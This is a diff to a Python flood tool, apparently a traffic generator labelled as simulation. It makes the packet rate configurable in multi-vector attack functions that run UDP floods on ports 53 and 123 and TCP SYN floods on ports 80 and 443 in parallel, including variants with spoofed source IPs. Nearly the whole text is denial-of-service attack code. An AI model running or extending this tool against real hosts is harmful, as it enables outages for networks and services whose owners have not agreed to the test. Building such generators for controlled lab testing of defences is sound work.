@@ -155,18 +155,22 @@ def http_flood(target_ip, target_port, duration, rps):
     print(f"[HTTP FLOOD] Complete: {requests_sent} requests")
     return requests_sent
 
-def mixed_attack(target_ip, duration):
+def mixed_attack(target_ip, duration, pps):
     """
     Simulate mixed attack (UDP + TCP + ICMP)
     """
-    print(f"[MIXED ATTACK] Starting multi-vector attack -> {target_ip} for {duration}s")
+    print(f"[MIXED ATTACK] Starting multi-vector attack -> {target_ip} at {pps} total pps for {duration}s")
+    
+    # Distribute pps
+    udp_pps = int(pps * 0.4)
+    tcp_pps = int(pps * 0.1)
     
     with ThreadPoolExecutor(max_workers=4) as executor:
         futures = [
-            executor.submit(udp_flood, target_ip, 53, duration, 500),
-            executor.submit(udp_flood, target_ip, 123, duration, 500),
-            executor.submit(tcp_syn_simulation, target_ip, 80, duration, 100),
-            executor.submit(tcp_syn_simulation, target_ip, 443, duration, 100),
+            executor.submit(udp_flood, target_ip, 53, duration, udp_pps),
+            executor.submit(udp_flood, target_ip, 123, duration, udp_pps),
+            executor.submit(tcp_syn_simulation, target_ip, 80, duration, tcp_pps),
+            executor.submit(tcp_syn_simulation, target_ip, 443, duration, tcp_pps),
         ]
         
         for future in futures:
@@ -295,18 +299,22 @@ def spoofed_tcp_syn_flood(target_ip, target_port, duration, pps, source_ip=None,
             
     print(f"[SPOOFED SYN] Complete: {packets_sent} packets sent")
 
-def spoofed_mixed_attack(target_ip, duration, source_ip=None, iface=None):
+def spoofed_mixed_attack(target_ip, duration, pps, source_ip=None, iface=None):
     """
     Simulate Spoofed Mixed Attack
     """
-    print(f"[SPOOFED MIXED] Starting multi-vector spoofed attack -> {target_ip}")
+    print(f"[SPOOFED MIXED] Starting multi-vector spoofed attack -> {target_ip} at {pps} total pps")
+    
+    # Distribute pps
+    udp_pps = int(pps * 0.4)
+    tcp_pps = int(pps * 0.1)
     
     with ThreadPoolExecutor(max_workers=4) as executor:
         futures = [
-            executor.submit(spoofed_udp_flood, target_ip, 53, duration, 200, source_ip, iface),
-            executor.submit(spoofed_udp_flood, target_ip, 123, duration, 200, source_ip, iface),
-            executor.submit(spoofed_tcp_syn_flood, target_ip, 80, duration, 100, source_ip, iface),
-            executor.submit(spoofed_tcp_syn_flood, target_ip, 443, duration, 100, source_ip, iface),
+            executor.submit(spoofed_udp_flood, target_ip, 53, duration, udp_pps, source_ip, iface),
+            executor.submit(spoofed_udp_flood, target_ip, 123, duration, udp_pps, source_ip, iface),
+            executor.submit(spoofed_tcp_syn_flood, target_ip, 80, duration, tcp_pps, source_ip, iface),
+            executor.submit(spoofed_tcp_syn_flood, target_ip, 443, duration, tcp_pps, source_ip, iface),
         ]
         
         for future in futures:
@@ -455,9 +463,9 @@ Examples:
         http_flood(args.target, args.port, args.duration, args.pps)
     elif args.type == 'mixed':
         if args.distributed:
-            spoofed_mixed_attack(args.target, args.duration, args.source, iface)
+            spoofed_mixed_attack(args.target, args.duration, args.pps, args.source, iface)
         else:
-            mixed_attack(args.target, args.duration)
+            mixed_attack(args.target, args.duration, args.pps)
     elif args.type == 'spike':
         volumetric_spike(args.target, args.duration, args.pps)
     
